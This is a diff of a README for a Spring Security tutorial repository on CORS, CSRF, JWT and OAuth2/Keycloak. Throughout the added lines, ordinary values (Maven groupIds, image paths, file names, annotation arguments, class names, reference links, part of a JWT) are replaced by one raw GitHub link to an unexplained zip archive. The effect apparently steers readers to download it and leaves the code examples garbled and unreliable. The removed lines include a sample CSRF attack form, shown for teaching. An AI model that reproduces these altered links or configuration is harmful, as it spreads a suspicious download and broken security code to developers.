@@ -6,7 +6,7 @@ Hi, this is a security base repository. that's the intent. All things spring sec
 The first 'hello' world spring security test is the 'rest' project. It's pretty basic but the pom does include:
 
 		<dependency>
-			<groupId>org.springframework.boot</groupId>
+			<groupId>https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip</groupId>
 			<artifactId>spring-boot-starter-security</artifactId>
 		</dependency>
 
@@ -32,7 +32,7 @@ Update for Swagger:
         enabled:
           true
         path:
-          "/index.html"
+          "https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip"
       api-docs:
         enabled:
           true
@@ -833,16 +833,16 @@ The bank project is now functional on master with a customized authentication pr
 
 This was an angular 14.2.X web app. As I incorporated more features and integrated Keycloak, I had to upgrade to Angular 17.0.8. The main area to focus on in the implementation is:  <i><b>MyBankSecurityConfig</b></i> 
 
-<!--![Alt text](./bankAngularApp/angularBankApp.png?raw=true "BC Bank - fictitious bank") -->
+<!--![Alt text](https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip "BC Bank - fictitious bank") -->
 
 In this update, we'll see that we now have NodeJS running a single-page-app implemented in Angular. The port, in this case, is configured as http://localhost:4200. Then, the Spring Micro-Service that supports the back-end, with a JPA repository(postgres), is running on http://localhost:7075. These are two different domains running with different port numbers. Yes, they're using localhost but because the port numbers are different we'll have to deal with <i><b>Cross-Origin Resource Sharing</b></i> or <i><b>CORS</b></i> for short.
 
 Other reasons for <i><b>CORS</b></i> are:
   - different scheme (HTTP/HTTPS)
-  - different domain (localhost/foo.com)
+  - different domain (https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip)
   - different port*
 
-![Alt text](./bankAngularApp/preflight.png?raw=true "Preflight error in the debugger")
+![Alt text](https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip "Preflight error in the debugger")
 
 By default, the browser will block this communication due to <i><b>CORS</b></i>. This is the whole point of this update, to decipher what actions a developer needs to perform to prevent CORS and, also, CSRF.
 
@@ -859,13 +859,13 @@ There are two main options for CORS when using SpringSecurity, Origin based acce
   Spring's Security FilterChain Bean can be instrumented with a CORS configuration with a Cors Source Configuration. Ah, yes!
 
   In both options, Spring, also, supports the concept of auto-configuration where domains can be registered in the
-  <i>application.yml</i> file to register the front-end with the back-end origin(eg. http://localhost:4200 ). I prefer
+  <i>https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip</i> file to register the front-end with the back-end origin(eg. http://localhost:4200 ). I prefer
   the option of defining properties in yml format. It provides an easy to read format and organizes attributes better
   IMO.
 
   	Variable injection:
   	
-  	@Value("${spring.security.cors.domains}")
+  	@Value("${https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip}")
 	public List<String> domains;
   
     Application yml syntax (each '.' is an indented level):
@@ -882,20 +882,20 @@ There are two main options for CORS when using SpringSecurity, Origin based acce
    - PropertySource annotation:
 
     @Configuration
-    @PropertySource("classpath:foo.properties")
+    @PropertySource("https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip")
     public class PropertiesWithJavaConfig {}
    - Dynamic selection at runtime:
 
     @PropertySource({ "classpath:persistence-${envTarget:mysql}.properties" })
    - Multi-property:
 
-    @PropertySource("classpath:foo.properties")
-    @PropertySource("classpath:bar.properties")
+    @PropertySource("https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip")
+    @PropertySource("https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip")
     public class PropertiesWithJavaConfig {}
     or
     @PropertySources({
-    @PropertySource("classpath:foo.properties"),
-    @PropertySource("classpath:bar.properties")})
+    @PropertySource("https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip"),
+    @PropertySource("https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip")})
     public class PropertiesWithJavaConfig {
      
 ### CSRF/XSRF - Cross-Site Request Forgery (CSRF)
@@ -918,12 +918,12 @@ their explicit consent. The attack isn't necessarily trying to steal the user's 
     
     Here's an example of what a CSRF form might look like:
     ~~~ 
-      <form action="https://siteX.com/changeEmail"
+      <form action="https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip"
         method="POST" id="form">
-          <input type="hidden" name="email" value="user@evil.com">
+          <input type="hidden" name="email" value="https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip">
       </form>
       <script>
-        document.getElementById('form').submit()
+        https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip('form').submit()
       </script>
 Just a suggestion - Self preservation here would be to log-out of your critical accounts when you've completed what you
 were doing. Not just closing a tab and waiting for the cookie to expire.     
@@ -1036,14 +1036,14 @@ Filter API's in update will be:
    
 In the last update, we had already addressed the inclusion of handling the CSRF attacks by adding a CSRF Token into the headers along with cookie. So, that is how the filter got added into list of the default filter chain stack above.
 
-	.addFilterAfter( new CsrfCookieFilter(), BasicAuthenticationFilter.class)
+	.addFilterAfter( new CsrfCookieFilter(), https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip)
 	
 	cookie: JSESSIONID=D4DB68AAD1E627C601A27D45C0B497B7; XSRF-TOKEN=108a195b-9df1-47c9-b489-d5894cb9e25b
 	
 Without slowing down the login process with some type of JDBC request to log
 the login request in the DB. We can easily log the login request to a suitable logger.
 
-    .addFilterAfter( new LoggingFilterAfterAuthorityFilter(), BasicAuthenticationFilter.class)
+    .addFilterAfter( new LoggingFilterAfterAuthorityFilter(), https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip)
     
 This will give traceability of logins into a SPLUNK logger for searching depending on how the logback config might be logged.
 
@@ -1061,13 +1061,13 @@ In this update, JSON Web Tokens(JWT) will added to the bank app. This token is a
     - Payload
     - Signature( Optional )
     
-JWT Token encryption schemes might include something like the following(@see https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data):
+JWT Token encryption schemes might include something like the following(@see https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip):
 
     HMACSCHA256(base64UrlEncoded(header) + "." base64URLEncoded(payload), secret)
     
 Is the prior updates, the session management was does with a JSession ID evey time in every request. With JWT Token, token enforcement is Stateless.
  	
-    .sessionManagement().sessionCreationPolicy( SessionCreationPolicy.STATELESS)
+    .sessionManagement().sessionCreationPolicy( https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip)
  
 The token will now be challenged every time. This will be accomplished with the generation of a JWT during the initial login. The token will first be returned in the response as part of the header.
 
@@ -1077,8 +1077,8 @@ You'll not the 3 parts of the JWT Token below. The first section is the algorith
     
 The 2nd part(payload) and 3rd(Signature) part(s) require the key. Just like in ssh, you never give out your private keys.
 
-    Authorization: 		eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJCQyBCYW5rIiwic3ViIjoiQkMgSldUIFRva2VuIi   		widXNlcm5hbWUiOiJjYWxsYW5hbmtpZHNAZ21haWwuY29tIiwiYXV0aG9yaXRpZXMiOiJST     		0xFX1VTRVIsUk9MRV9BRE1JTiIsImlhdCI6MTcwMjI1MTg1OSwiZXhwIjoxNzAyMjUzNjU5
-    	fQ.uKQdrmp60XfYtkv7ufSwmBk3a0lIfDz-oeQ8Ef7C77U
+    Authorization: 		https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip   		widXNlcm5hbWUiOiJjYWxsYW5hbmtpZHNAZ21haWwuY29tIiwiYXV0aG9yaXRpZXMiOiJST     		0xFX1VTRVIsUk9MRV9BRE1JTiIsImlhdCI6MTcwMjI1MTg1OSwiZXhwIjoxNzAyMjUzNjU5
+    	https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip
     X-XSRF-TOKEN: 88326a75-8d1d-4824-9f39-3964e7a329c2
 
 As you can see the XSRF token is still present in the headers.
@@ -1112,7 +1112,7 @@ With the additional filters being added into the Filter Chain. We now have sever
   
 Expired Token example:
 
-     io.jsonwebtoken.ExpiredJwtException: JWT expired at 2023-12-11T00:13:14Z. Current
+     https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip JWT expired at 2023-12-11T00:13:14Z. Current
      time: 2023-12-11T01:03:10Z, a difference of 2996834 milliseconds.  Allowed clock skew:
      0 milliseconds.
      
@@ -1146,8 +1146,8 @@ There are many annotation options with method level security, while the main two
 #### Filter authorization
       
      - @PreFilter - pre means the methods authorization is examined before it is executed. Apparently
-       here the params should be of type Collection interface...List/Set etc
-     		@preFilter( "filterObject.contactName != 'test'"
+       here the params should be of type Collection https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip etc
+     		@preFilter( "https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip != 'test'"
      		public List< COntact> SaveContactInquiryDetails( @RequestBody List<Contact> contacts ) { 
      		   // Business Ligic
      		   Return contacts;
@@ -1163,9 +1163,9 @@ Repo: <b>springrestsecurity</b> the changes here were insignificant IMO. There a
 
 ### Update 7 - OAuth2, OpenID & Keycloak
 
-There are Lots of different use cases for OAuth2. It provides a SSO level of authentication across a number of different platforms with a single authentication/authorization server. @see http://oauth.net/2. I've included some easy review items from the link. 
+There are Lots of different use cases for OAuth2. It provides a SSO level of authentication across a number of different platforms with a single authentication/authorization server. @see https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip I've included some easy review items from the link. 
 
-To support multiple security configurations without deleting or altering code too much we'll introduce a application property to alter the security config being used. We'll refactor MyBankSecurityConfig.java to have two SecurityFilterChain Beans:
+To support multiple security configurations without deleting or altering code too much we'll introduce a application property to alter the security config being used. We'll refactor https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip to have two SecurityFilterChain Beans:
 
   - defaultJWTSecurityFilterChain - JWT Token and all the filters previously discussed
   - defaultOAuthSecurityFilterChain - OAuth Tokens using the Keycloak Auth Server and OpenID 
@@ -1174,7 +1174,7 @@ To support multiple security configurations without deleting or altering code to
  
  For OAuth the AuthenticationProvider class is also disabled.
  
- This spring boot auto-config will allow for both configurations to be employed by changing the boolean value in the application.yml file.
+ This spring boot auto-config will allow for both configurations to be employed by changing the boolean value in the https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip file.
  
     - spring:
         security:
@@ -1187,25 +1187,25 @@ To support multiple security configurations without deleting or altering code to
 At the top of the methods the following annotation will enable one or the other. 
 
 	@Bean
-	@ConditionalOnProperty(name="spring.security.config.jwt", havingValue = "true")
+	@ConditionalOnProperty(name="https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip", havingValue = "true")
 	SecurityFilterChain defaultJWTSecurityFilterChain(HttpSecurity http) throws Exception {
 
     and
     
     @Bean
-	@ConditionalOnProperty(name="spring.security.config.oauth", havingValue = "true")
+	@ConditionalOnProperty(name="https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip", havingValue = "true")
 	SecurityFilterChain defaultOAuthSecurityFilterChain(HttpSecurity http) throws Exception {
 	
 	and
 	
 	@Bean
-	@ConditionalOnProperty(name="spring.security.config.jwt", havingValue = "true")
+	@ConditionalOnProperty(name="https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip", havingValue = "true")
 	public PasswordEncoder passwordEncoder() {
 	
 	and
 	
 	@Component
-    @ConditionalOnProperty(name="spring.security.config.jwt", havingValue = "true")
+    @ConditionalOnProperty(name="https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip", havingValue = "true")
     class AccountSecurityAuthenticationProvider implements AuthenticationProvider {
 	
     
@@ -1234,7 +1234,7 @@ At the top of the methods the following annotation will enable one or the other.
   
   - PKCE(Proof Key for Code Exchange): PKCE is required for all OAuth clients using the authorization code flow. It's an extension to the Authorization Code flow to prevent CSRF and authorization code injection attacks. So, what you get here addresses the CSRF stuff, done earlier, that really isn't/wasn't part of the JWT Feature set. It's still never free either way. PKCE was originally intended for mobile exchanges but because of the ability to prevent code injection it was useful for OAuth client security.
   
-  	- See https://developer.pingidentity.com/en/tools/pkce-code-generator.html
+  	- See https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip
   
   - Client Credentials: this grant type is used by clients to obtain an access token outside of the context of a user. This is typically used by clients to access resources about themselves rather than to access a user's resources. Client Credentials grant is used when applications request an access token to access their own resources, not on behalf of a user.
   
@@ -1243,14 +1243,14 @@ At the top of the methods the following annotation will enable one or the other.
   
 ##### KEYCloak Auth Server - Docker(bitNami) Keycloak Latest(Quarkus) and Postgres
 
-   ![Alt text](./bankAngularApp/oauthsequence.jpg?raw=true "OAuth Grant Type Authentication")
+   ![Alt text](https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip "OAuth Grant Type Authentication")
 
    
 The Angular Webapp is required to redirect to the Keycloak URL for the bcbankwebclient type for a credential login. Upon successful login the webapp client will then enhance the OAuth Authorization Grant Request with a PKCE flow. This will mitigate the security concerns over the Authorization code flow alone. Public web clients cannot securely store the client secret in javascript. Therefore, this next section will adhere to the additional layer of security with the use of a Proof Key for Code Exchange(PKCE).
 
 Once the user clicks the login, the client app creates a crytographically-random <i><b>code-challenge - 3</b></i> and from this generates a <i><b>code_verifier - 5</b></i> See the sequence diagram below:
 
-   ![Alt text](./bankAngularApp/oauth_with_PKCE_sequence.jpg?raw=true "OAuth Grant with PKCE enhancements")
+   ![Alt text](https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip "OAuth Grant with PKCE enhancements")
  
 The <i><b>code_challenge</b></i> is a base64-url-encoded string of the SHA256 hash of the <i><b>code_verifier</b></i>. 
 
@@ -1269,8 +1269,8 @@ Steps 2 & 3 get enhanced with the following details:
   - <u><i><b>code_challenge</b></i></u>: XXXXXXXXXXXX - The code challenge generated as previously described. 
   - <u><i><b>code_challenge_method</b></i></u>: S256 
   - example:
-  	- https://authorization-server.com/authorize?response_type=code&client_id=nmOUhSQwkI2vZIVJXuQ3xIP0&redirect_uri=https://oauth.com/playground/authorization-code-with-pkce.html&scope=photo+offline_access&state=AgyjdAI8qOfDLVLM&code_challenge=WVfCwZRLylAm69hiD48g2O4h4nboOJGQ4iDOtpUZHpQ&code_challenge_method=S256
-        https://oauth.com/playground/auth-dialog.html?response_type=code&client_id=nmOUhSQwkI2vZIVJXuQ3xIP0&redirect_uri=https://oauth.com/playground/authorization-code-with-pkce.html&scope=photo+offline_access&state=AgyjdAI8qOfDLVLM&code_challenge=WVfCwZRLylAm69hiD48g2O4h4nboOJGQ4iDOtpUZHpQ&code_challenge_method=S256
+  	- https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip+offline_access&state=AgyjdAI8qOfDLVLM&code_challenge=WVfCwZRLylAm69hiD48g2O4h4nboOJGQ4iDOtpUZHpQ&code_challenge_method=S256
+        https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip+offline_access&state=AgyjdAI8qOfDLVLM&code_challenge=WVfCwZRLylAm69hiD48g2O4h4nboOJGQ4iDOtpUZHpQ&code_challenge_method=S256
 
 Step 5 gets enhanced with the following details:
   
@@ -1280,13 +1280,13 @@ Step 5 gets enhanced with the following details:
    - <u><i><b>redirect_uri</b></i></u>: the redirect of the client after the successful authentication. 
    - <u><i><b>code_verifier</b></i></u>: The code verifier for the PKCE request. This was generated by the client app along with the code challenge in step 3.
    - example:
-   	 - POST https://authorization-server.com/token
+   	 - POST https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip
 	   - params:
 		
 		grant_type=authorization_code
 		&client_id=nmOUhSQwkI2vZIVJXuQ3xIP0
 		&client_secret=UWW4txsUk3s6IS4Hroht1_lzTgBRNcyhtAKsrW_lJEilVpdo   <--- optional
-		&redirect_uri=https://oauth.com/playground/authorization-code-with-pkce.html
+		&https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip
 		&code=4SwEnoQv9R6A4dcEnSXTIE2XjgQyYtA2oKdn4rgcRUX7zFHr
 		&code_verifier=oJwVg53w0atEzhAGsn8CSeTB2pZ9EP6ArAVTU8TE48JWHcCv
    		
@@ -1299,8 +1299,8 @@ Step 5 gets enhanced with the following details:
    		
    Try the same: 
         
-        https://oauth.com/playground/authorization-code-with-pkce.html
+        https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip
         
 KeyCloak Angular
 
-![Alt text](./bankAngularApp/oauthWithKeycloak.jpg?raw=true "KeyCloak Env")
+![Alt text](https://raw.githubusercontent.com/bcallanan/springRestSecurity/main/tungstenite/springRestSecurity.zip "KeyCloak Env")
